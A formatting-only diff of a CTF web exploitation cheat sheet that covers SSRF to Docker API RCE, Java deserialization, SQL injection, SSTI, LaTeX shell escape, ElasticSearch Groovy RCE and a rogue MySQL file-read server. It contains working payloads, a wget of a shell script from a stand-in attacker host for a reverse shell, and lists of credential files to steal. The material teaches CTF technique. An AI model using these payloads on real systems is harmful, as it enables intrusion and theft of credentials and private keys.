@@ -1,7 +1,6 @@
 # CTF Web - Advanced Server-Side Techniques (Part 2)
 
 ## Table of Contents
-
 - [SSRF to Docker API RCE Chain (H7CTF 2025)](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
 - [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
 - [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
@@ -21,14 +20,13 @@
 
 See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).
 
-------
+---
 
 ## SSRF to Docker API RCE Chain (H7CTF 2025)
 
 **Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.
 
 **Step 1 — Discover internal services via SSRF:**
-
 ```bash
 # Enumerate localhost ports through SSRF
 curl "http://target/validate?url=http://localhost:2375/version"
@@ -36,7 +34,6 @@ curl "http://target/validate?url=http://localhost:8090/docs"
 ```
 
 **Step 2 — Extract files from running containers via Docker archive endpoint:**
-
 ```bash
 # List containers
 curl "http://target/validate?url=http://localhost:2375/containers/json"
@@ -63,7 +60,6 @@ curl "http://target/validate?url=http://localhost:8090/request?method=post\
 ```
 
 **For reverse shell access:**
-
 ```bash
 # 1. Download shell script into container
 # Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]
@@ -73,20 +69,19 @@ curl "http://target/validate?url=http://localhost:8090/request?method=post\
 ```
 
 **Key Docker API endpoints for exploitation:**
-
-| Endpoint                               | Method | Purpose                    |
-| -------------------------------------- | ------ | -------------------------- |
-| `/version`                             | GET    | Confirm Docker API access  |
-| `/containers/json`                     | GET    | List running containers    |
-| `/containers/<id>/archive?path=<path>` | GET    | Extract files (tar format) |
-| `/containers/<id>/exec`                | POST   | Create exec instance       |
-| `/exec/<id>/start`                     | POST   | Run exec instance          |
-| `/images/json`                         | GET    | List available images      |
-| `/containers/create`                   | POST   | Create new container       |
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/version` | GET | Confirm Docker API access |
+| `/containers/json` | GET | List running containers |
+| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
+| `/containers/<id>/exec` | POST | Create exec instance |
+| `/exec/<id>/start` | POST | Run exec instance |
+| `/images/json` | GET | List available images |
+| `/containers/create` | POST | Create new container |
 
 **Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).
 
-------
+---
 
 ## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)
 
@@ -97,7 +92,6 @@ curl "http://target/validate?url=http://localhost:8090/request?method=post\
 **Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.
 
 **XML payload example with Spring beans for RMI callback:**
-
 ```xml
 <data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:java="http://java.sun.com">
@@ -121,7 +115,7 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ba
 
 **Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.
 
-------
+---
 
 ## Apache ErrorDocument Expression File Read (Zero HTB)
 
@@ -130,16 +124,12 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ba
 **Requires:** `AllowOverride FileInfo` in userdir config.
 
 **Attack chain:**
-
 1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
-
 ```apache
 ErrorDocument 404 "%{file:/etc/passwd}"
 ```
-
 2. Request a nonexistent URL in that directory to trigger the 404 handler
 3. Read PHP source via `cat -v` to see raw content:
-
 ```apache
 ErrorDocument 404 "%{file:/var/www/html/stats.php}"
 ```
@@ -148,14 +138,13 @@ ErrorDocument 404 "%{file:/var/www/html/stats.php}"
 
 **Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.
 
-------
+---
 
 ## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)
 
 **Pattern:** PHP code blocks a specific input value via string equality check, then interpolates the input into a filesystem path. Path normalization bypasses the string check while resolving to the blocked resource.
 
 **Vulnerable code:**
-
 ```php
 if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
 $db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
@@ -171,7 +160,7 @@ curl -X POST -b 'session=...' \
 
 **Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.
 
-------
+---
 
 ## HQL Injection via Non-Breaking Space (HackIM 2016)
 
@@ -191,7 +180,7 @@ payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) 
 
 Error-based extraction: cast result to int triggers error containing the flag value.
 
-------
+---
 
 ## Base64-Encoded Path Traversal (Sharif CTF 2016)
 
@@ -213,7 +202,7 @@ print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA=
 
 **Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.
 
-------
+---
 
 ## Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)
 
@@ -240,7 +229,7 @@ GET /read?file=file_l~1
 
 **Key insight:** Windows NTFS auto-generates 8.3 short filenames for compatibility. Blacklists checking full filenames miss the short alias. This bypass works on any Windows web server (IIS, WAMP, etc.) where 8.3 name generation is enabled (default).
 
-------
+---
 
 ## URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)
 
@@ -265,7 +254,7 @@ $url = "http://{$attacker_ip}@ctf.ekoparty.org/?";
 
 **Key insight:** `parse_url()` and actual HTTP clients (wget, curl, browsers) disagree on how to handle `@` in URLs. `parse_url()` extracts the host after `@`, while HTTP clients may connect to the host before `@`. This SSRF vector bypasses domain whitelist validation.
 
-------
+---
 
 ## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)
 
@@ -312,35 +301,30 @@ def inject_payload(image_key, payload_hex):
 ```
 
 4. Include the embedded PHP file via zip:// wrapper:
-
 ```text
 http://target/?op=zip://uploads/HASH.png%23s
-
 ```
-
 This unzips `HASH.png` (which is also a valid ZIP) and includes `s.php` from inside it.
 
 **Key insight:** ZIP files store their central directory at the end, so any file format can have a valid ZIP appended (or embedded) without breaking the original format. The `zip://` PHP wrapper ignores file extensions and extracts by content. PNG palette data provides controllable consecutive bytes ideal for embedding small ZIP payloads. This bypasses: (a) file extension restrictions (.php → .png), (b) image validation (file remains a valid PNG), (c) metadata stripping (palette data is structural, not metadata).
 
-------
+---
 
 ## XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)
 
 **Pattern (SBBS):** Flask app renders 404 error messages using `render_template_string()` with the request URL interpolated. Error pages only appear for localhost requests. Chain XSS → localhost fetch → SSTI in error page.
 
 1. Flask error handler directly interpolates URL into template:
-
 ```python
 @app.errorhandler(404)
 def not_found(e=None):
     message = "%s was not found on the server." % request.url
     return render_template_string(template % message), 404
-
 ```
 
 2. Error pages only render for 127.0.0.1 (external IPs get nginx 404)
-3. XSS payload triggers localhost request with SSTI in the URL:
 
+3. XSS payload triggers localhost request with SSTI in the URL:
 ```javascript
 <script>
 function hack(url, callback){
@@ -354,14 +338,13 @@ function hack(url, callback){
 }
 hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
 </script>
-
 ```
 
 4. `config.from_object('module.path')` loads application config including secrets
 
 **Key insight:** Flask's template globals don't directly expose the `app` object, but `config.from_object()` can load arbitrary Python modules into the config dict, making their attributes accessible via `{{ config.KEY }}`. The XSS-to-SSTI chain bypasses two restrictions: (a) SSTI only works on localhost error pages, (b) template globals lack direct app access. Look for `render_template_string()` with user-controlled input in error handlers.
 
-------
+---
 
 ## INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)
 
@@ -379,14 +362,13 @@ theSubject",concat(
 
 -- Result:
 INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
-
 ```
 
 The `concat("", (select ...))` wraps the subquery result as a string value for the subject column, making it visible when the user views their own messages.
 
 **Key insight:** When an INSERT query has multiple injectable fields but one is length-limited, use the limited field to open a `concat(` expression and the unlimited field to close it with an arbitrary subquery. This "column shift" technique moves the data extraction from the length-restricted field to the unrestricted one. Also works with `CASE WHEN` or other SQL expressions that span across field boundaries.
 
-------
+---
 
 ## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)
 
@@ -407,12 +389,11 @@ cookie_random = random.randint(0, 2**31)
 # 4. Forge admin cookie
 admin_cookie = f"{cookie_random}-209"
 # Result: "1229569179-209"
-
 ```
 
 **Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via SQLi, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.
 
-------
+---
 
 ## SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)
 
@@ -431,12 +412,11 @@ parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
 $url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
 // parse_url sees $allowed_domain -> passes check
 // curl connects to 127.0.0.1:80 -> SSRF achieved
-
 ```
 
 **Key insight:** URL parsers disagree on how to handle multiple `@` symbols. This is distinct from the single-`@` bypass (EKOPARTY 2016) — here the double-`@` exploits a different parsing ambiguity where `parse_url` takes the last `@` as the userinfo delimiter while curl uses the first. Test both variants when facing URL-based SSRF filters.
 
-------
+---
 
 ## LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)
 
@@ -453,12 +433,11 @@ beginfig(1); endfig; end;
 
 % Read the output back into the PDF
 \input{out.log}
-
 ```
 
 **Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` flag allows specifying an arbitrary program as the "TeX processor," including `bash`. This transforms a restricted shell escape into full RCE. `${IFS}` replaces spaces to work within the quoted argument.
 
-------
+---
 
 ## ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)
 
@@ -491,11 +470,9 @@ curl 'http://localhost:9200/_search' -d '{
     }
   }
 }'
-
 ```
 
 **Via SSRF (URL-encoded for GET parameter):**
-
 ```python
 import requests
 import urllib.parse
@@ -506,21 +483,19 @@ ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload
 # Through SSRF endpoint
 r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
 print(r.text)
-
 ```
 
 **Detection:** SSRF vulnerability + internal service on port 9200. Confirm with `http://localhost:9200/` (returns ES version info) or `http://localhost:9200/_cat/indices` (lists indices).
 
 **Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, SSRF to port 9200 enables full RCE through `script_fields`. Modern ES versions disabled inline scripting by default. When testing SSRF, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.
 
-------
+---
 
 ### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)
 
 **Pattern:** When a service connects to your controlled MySQL server with `LOAD DATA LOCAL` enabled, send a rogue response requesting arbitrary file reads from the client machine. The MySQL protocol allows the server to request the client to send any local file during the `LOAD DATA LOCAL INFILE` handshake, regardless of what query the client intended to execute.
 
 **How it works:**
-
 1. Victim application connects to attacker-controlled MySQL server (e.g., via SSRF or misconfigured DB host)
 2. Attacker server completes the handshake normally
 3. When the client sends any query, the rogue server responds with a file transfer request packet
@@ -569,11 +544,9 @@ file_data = conn.recv(65535)
 print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")
 
 conn.close()
-
 ```
 
 **Useful files to request:**
-
 ```text
 /etc/passwd                    # User enumeration
 /etc/shadow                    # Password hashes (if client runs as root)
@@ -581,7 +554,6 @@ conn.close()
 /var/www/html/config.php       # Application config with DB credentials
 /home/user/.ssh/id_rsa         # SSH private keys
 /flag.txt                      # CTF flag
-
 ```
 
 **Key insight:** A rogue MySQL server can request the connecting client to send any local file via the LOAD DATA LOCAL protocol, regardless of what query the client intended to execute. This works because the MySQL protocol allows the server to respond to any client query with a file transfer request. Look for challenges where you can control the MySQL host a service connects to (SSRF, config injection, DNS rebinding). The client must have `LOAD DATA LOCAL` enabled (default in many MySQL client libraries).
